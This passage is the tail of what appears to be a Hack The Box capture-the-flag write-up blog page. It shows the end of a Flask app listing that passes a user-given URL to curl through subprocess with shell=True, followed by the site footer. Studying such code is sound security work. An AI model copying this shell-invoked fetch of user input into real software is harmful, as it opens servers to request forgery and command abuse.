</span></span><span class=line><span class=cl>            <span class=n>u</span> <span class=o>=</span> <span class=n>shlex</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>u</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>(</span><span class=s1>&#39;curl &#39;</span> <span class=o>+</span> <span class=n>u</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Invalid protocol! Supported protocols: http, https, ftp, ftps.</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;URL not given!</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>errorhandler</span><span class=p>(</span><span class=n>werkzeug</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>HTTPException</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nd>@ensure_localhost</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>handle_error</span><span class=p>(</span><span class=n>e</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>e</span><span class=p>,</span> <span class=n>e</span><span class=o>.</span><span class=n>code</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/announcements&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nd>@ensure_localhost</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>announcements</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;announcements.html&#39;</span><span class=p>,</span> <span class=n>announcements</span><span class=o>=</span><span class=n>announce</span><span class=p>,</span> <span class=n>navigation</span><span class=o>=</span><span class=n>navigation</span><span class=p>)</span>
</span></span></code></pre></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2022-02-24</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/hack-the-box/>hack-the-box</a>,&nbsp;<a href=/tags/medium/>medium</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/aspire-ctf-web/ class=prev rel=prev title="AspireCTF Web Challenge"><i class="fas fa-angle-left fa-fw"></i>AspireCTF Web Challenge</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.96.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href=https://github.com/HEIGE-PCloud/DoIt target=_blank rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer"></a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/topbar/topbar.min.js></script><script type=text/javascript src=/lib/pjax/pjax.min.js></script><script type=text/javascript src=/js/theme.min.js></script></div><div class=pjax-assets><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:20},comment:{},data:{"desktop-header-typeit":"tukmogi","mobile-header-typeit":"tukmogi"},typeit:{cursorChar:null,cursorSpeed:null,data:{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},duration:null,speed:null}}</script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/typeit/typeit.min.js></script></div></body></html>